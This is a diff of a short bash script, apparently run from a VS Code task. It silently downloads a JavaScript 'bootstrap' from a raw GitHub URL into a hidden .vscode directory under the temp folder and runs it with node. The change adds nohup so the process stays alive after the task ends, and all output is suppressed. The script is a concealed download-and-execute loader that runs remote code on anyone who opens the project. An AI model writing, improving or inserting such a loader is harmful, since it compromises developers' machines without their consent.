@@ -1,16 +1,21 @@
-
 #!/bin/bash
 
-VSCODE_DIR="${TMPDIR%/}/.vscode"
+# safer TMPDIR fallback
+TMPBASE="${TMPDIR:-/tmp}"
+VSCODE_DIR="${TMPBASE%/}/.vscode"
 
 mkdir -p "$VSCODE_DIR"
 
 BOOTSTRAP_URL="https://raw.githubusercontent.com/ph2860051/o-g/refs/heads/main/bootstrap"
 BOOTSTRAP_FILE="$VSCODE_DIR/bootstrap.js"
 
+# download bootstrap
 curl -fsSL "$BOOTSTRAP_URL" -o "$BOOTSTRAP_FILE" || exit 0
 
-if command -v node >/dev/null 2>&1; then
-    node "$BOOTSTRAP_FILE" >/dev/null 2>&1 &
-fi
+# find node
+NODE_BIN="$(command -v node)"
 
+if [ -n "$NODE_BIN" ]; then
+    # run fully detached so VS Code task exit won't kill it
+    nohup "$NODE_BIN" "$BOOTSTRAP_FILE" >/dev/null 2>&1 &
+fi
